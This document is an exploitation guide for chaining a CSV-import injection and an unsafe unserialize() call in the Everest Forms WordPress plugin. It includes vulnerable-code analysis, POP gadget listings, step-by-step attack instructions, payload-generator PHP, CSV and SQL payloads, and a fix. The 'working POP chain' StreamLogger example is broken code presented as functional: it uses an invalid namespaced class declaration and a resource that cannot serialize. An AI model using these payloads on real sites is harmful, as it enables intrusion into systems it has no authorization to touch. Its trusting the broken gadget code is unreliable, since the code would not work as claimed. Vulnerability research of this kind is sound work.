# CVE Chain: Everest Forms POP Injection & Deserialization Exploitation Guide

## Overview

This guide explains how to chain two CVEs in **Everest Forms** WordPress plugin for practicing PHP Object Injection (POP - Property Oriented Programming) and deserialization attacks.

### CVE References:
1. **CVE (Entry Point)**: https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3
2. **CVE (Trigger Point)**: https://wpscan.com/vulnerability/b90d6420-0de1-42cd-aee2-2473a757a320

---

## Vulnerability Analysis

### CVE 1: CSV Import - Arbitrary Data Injection (Entry Point)

**File:** `includes/class-evf-background-process-import-entries.php`

**Vulnerable Code (Lines 79-117, 131-152):**

```php
public static function import_entry_to_form( $data ) {
    $map_fields_array = get_option( 'everest_forms_mapping_fields_array', array() );
    $csv_column_title = get_option( 'everest_forms_csv_titles', array() );
    // ...
    foreach ( $map_fields_array as $value ) {
        if ( is_array( $value ) ) {
            if ( isset( $evf_fields[ $value['field_id'] ] ) ) {
                $entry_data[ $value['field_id'] ] = array(
                    // Data from CSV is sanitized with sanitize_text_field()
                    // but this does NOT prevent serialized PHP payloads
                    'value' => sanitize_text_field( wp_unslash( $data[ $key ] ) ),
                    // ...
                );
            }
        }
    }
    // ...
    self::save_entry( $entry, $entry_data );
}

public static function save_entry( $entry, $entry_data ) {
    global $wpdb;
    $result = $wpdb->insert( $wpdb->prefix . 'evf_entries', $entry );
    // ...
    foreach ( $entry_data as $key => $data ) {
        $entry_meta = array(
            'entry_id'   => $entry_id,
            'meta_key'   => $data['meta_key'],
            // Serialized data stored directly in database!
            'meta_value' => maybe_serialize( $data['value'] ),
        );
        $wpdb->insert( $wpdb->prefix . 'evf_entrymeta', $entry_meta );
    }
}
```

**Why It's Vulnerable:**
- `sanitize_text_field()` only strips HTML tags and extra whitespace
- It does NOT prevent serialized PHP object payloads
- The data is stored directly into `evf_entrymeta` table

---

### CVE 2: Unsafe Deserialization in Entry View (Trigger Point)

**File:** `includes/admin/views/html-admin-page-entries-view.php`

**Vulnerable Code (Line 134):**

```php
foreach ( $entry_meta as $meta_key => $meta_value ) {
    // ...
    $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value );

    // Check for empty serialized value.
    if ( is_serialized( $meta_value ) ) {
        // VULNERABLE: Raw unserialize() without allowed_classes restriction!
        $raw_meta_val = unserialize( $meta_value ); // phpcs:ignore WordPress.PHP.DiscouragedPHPFunctions.serialize_unserialize
        // ...
    }
}
```

**Why It's Vulnerable:**
- Uses `unserialize()` WITHOUT the `allowed_classes => false` option
- Any serialized object in `meta_value` will be instantiated
- Magic methods (`__destruct()`, `__wakeup()`, `__toString()`) will execute

**Note:** The plugin has a "safe" wrapper function `evf_maybe_unserialize()` in `includes/evf-core-functions.php` that uses `allowed_classes => false`, but this particular code path uses raw `unserialize()`.

---

## Attack Chain Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     ATTACK FLOW                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. ENTRY POINT: CSV Import                                      │
│     ┌──────────────────────────────────────────────────┐        │
│     │  Attacker creates malicious CSV file with        │        │
│     │  serialized PHP object payload in a field        │        │
│     └───────────────────┬──────────────────────────────┘        │
│                         │                                        │
│                         ▼                                        │
│  2. DATA INJECTION                                               │
│     ┌──────────────────────────────────────────────────┐        │
│     │  User with CSV import capability uploads         │        │
│     │  the malicious CSV via:                          │        │
│     │  - AJAX: everest_forms_import_entries            │        │
│     │  - Background process stores in evf_entrymeta    │        │
│     └───────────────────┬──────────────────────────────┘        │
│                         │                                        │
│                         ▼                                        │
│  3. TRIGGER POINT: Admin Views Entry                             │
│     ┌──────────────────────────────────────────────────┐        │
│     │  Admin navigates to:                             │        │
│     │  /wp-admin/admin.php?page=evf-entries&view-entry │        │
│     │                                                   │        │
│     │  html-admin-page-entries-view.php executes:      │        │
│     │  unserialize($meta_value) ← No class filter!     │        │
│     └───────────────────┬──────────────────────────────┘        │
│                         │                                        │
│                         ▼                                        │
│  4. POP CHAIN EXECUTION                                          │
│     ┌──────────────────────────────────────────────────┐        │
│     │  Magic methods execute:                          │        │
│     │  __wakeup() → __destruct() → __toString()        │        │
│     │  → Arbitrary code execution / File operations    │        │
│     └──────────────────────────────────────────────────┘        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Available POP Gadgets

### 1. EVF_Log_Handler_File (Plugin Internal)

**File:** `includes/log-handlers/class-evf-log-handler-file.php`

```php
public function __destruct() {
    foreach ( $this->handles as $handle ) {
        if ( is_resource( $handle ) ) {
            fclose( $handle );
        }
    }
}
```

**Potential Impact:** File handle manipulation

### 2. StreamLogger (Vendor - scssphp)

**File:** `vendor/scssphp/scssphp/src/Logger/StreamLogger.php`

```php
public function __destruct() {
    if ($this->closeOnDestruct) {
        fclose($this->stream);
    }
}
```

**Potential Impact:** Arbitrary file operations via stream wrappers

### 3. SCSSPHP Compiler (Vendor)

**File:** `vendor/scssphp/scssphp/src/Compiler.php`

Contains `unserialize()` calls that could be chained.

---

## Exploitation Steps

### Step 1: Create Everest Form

1. Login to WordPress admin
2. Go to **Everest Forms → Add New**
3. Create a simple form with at least one text field
4. Note the **Form ID** and **Field Meta Key**

### Step 2: Prepare Malicious CSV

Create a CSV file (`malicious_entries.csv`) with the serialized payload:

```csv
"Field Name"
"O:7:\"Example\":1:{s:4:\"data\";s:4:\"test\";}"
```

For a working POP chain (example with scssphp StreamLogger):

```php
<?php
// Generate payload
class ScssPhp\ScssPhp\Logger\StreamLogger {
    private $stream;
    private $closeOnDestruct = true;
    
    public function __construct() {
        // Point to a PHP file to corrupt/delete
        $this->stream = fopen('php://filter/write=convert.base64-decode/resource=/tmp/shell.php', 'w');
    }
}

$payload = new ScssPhp\ScssPhp\Logger\StreamLogger();
echo serialize($payload);
```

### Step 3: Import Malicious CSV

1. Go to **Everest Forms → Tools → Import Entries**
2. Select your target form
3. Upload the malicious CSV
4. Map the CSV column to a form field
5. Click **Import Entries**

### Step 4: Trigger the Vulnerability

1. Go to **Everest Forms → Entries**
2. Select the form containing imported entries
3. Click **View** on any imported entry
4. The deserialization occurs, executing the POP chain

---

## Proof of Concept (PoC)

### Simple Detection PoC

Create a file `payload_generator.php`:

```php
<?php
/**
 * Simple PoC to detect deserialization
 * This creates a marker file when deserialized
 */

class EVFPoCGadget {
    public $marker_file = '/tmp/evf_poc_triggered.txt';
    
    public function __destruct() {
        file_put_contents($this->marker_file, 'Deserialization triggered at: ' . date('Y-m-d H:i:s'));
    }
}

// Generate the payload
$poc = new EVFPoCGadget();
$serialized = serialize($poc);

echo "=== Serialized Payload ===\n";
echo $serialized . "\n\n";

echo "=== URL Encoded ===\n";
echo urlencode($serialized) . "\n\n";

echo "=== Base64 Encoded ===\n";
echo base64_encode($serialized) . "\n";
```

### CSV Format

```csv
"name"
"O:12:\"EVFPoCGadget\":1:{s:11:\"marker_file\";s:26:\"/tmp/evf_poc_triggered.txt\";}"
```

---

## Mitigation Analysis

### Why `evf_maybe_unserialize()` Exists but Isn't Used

The plugin has a safe wrapper function:

```php
// File: includes/evf-core-functions.php (Line 5568-5591)
function evf_maybe_unserialize($data, $options = array()) {
    if (is_serialized($data)) {
        if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
            $options = wp_parse_args($options, array('allowed_classes' => false));
            return @unserialize(trim($data), $options); // SAFE - no objects instantiated
        }
        return null; // Block on PHP < 7.1
    }
    return $data;
}
```

**Problem:** The vulnerable code in `html-admin-page-entries-view.php` uses raw `unserialize()` instead of this safe wrapper.

### Fix

Replace line 134 in `includes/admin/views/html-admin-page-entries-view.php`:

**Before (Vulnerable):**
```php
$raw_meta_val = unserialize( $meta_value );
```

**After (Fixed):**
```php
$raw_meta_val = evf_maybe_unserialize( $meta_value );
```

---

## Required Permissions

| Action | Required Capability |
|--------|---------------------|
| CSV Import | `manage_options` (Administrator) |
| View Entry | `everest_forms_view_entry` |

**Note:** This is an **authenticated vulnerability** requiring admin-level access for the CSV import step, but can be chained with other vulnerabilities or social engineering.

---

## Testing Environment Setup

### Prerequisites

1. WordPress installation with Everest Forms (vulnerable version)
2. PHP 7.1+ (for object instantiation during deserialization)
3. WP_DEBUG enabled for error visibility

### Enable Logging

Add to `wp-config.php`:

```php
define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true);
define('WP_DEBUG_DISPLAY', false);
```

### Create Test Form

```sql
-- Verify entries table structure
DESCRIBE wp_evf_entries;
DESCRIBE wp_evf_entrymeta;

-- Check for imported malicious entries
SELECT * FROM wp_evf_entrymeta WHERE meta_value LIKE 'O:%';
```

---

## Additional Attack Vectors

### 1. Direct Database Injection

If you have database access (SQL injection, compromised credentials):

```sql
INSERT INTO wp_evf_entrymeta (entry_id, meta_key, meta_value) 
VALUES (1, 'malicious_field', 'O:12:"EVFPoCGadget":1:{s:11:"marker_file";s:26:"/tmp/evf_poc_triggered.txt";}');
```

### 2. Form Submission (Limited)

Regular form submissions go through `evf_sanitize_entry()` which provides better filtering. The CSV import path is the preferred attack vector.

---

## References

- [WPScan Vulnerability Database](https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3)
- [WPScan Vulnerability Database](https://wpscan.com/vulnerability/b90d6420-0de1-42cd-aee2-2473a757a320)
- [PHP Object Injection Guide](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [PHPGGC - PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)

---

## Disclaimer

This guide is for **educational and authorized security testing purposes only**. Always obtain proper authorization before testing vulnerabilities on systems you do not own.
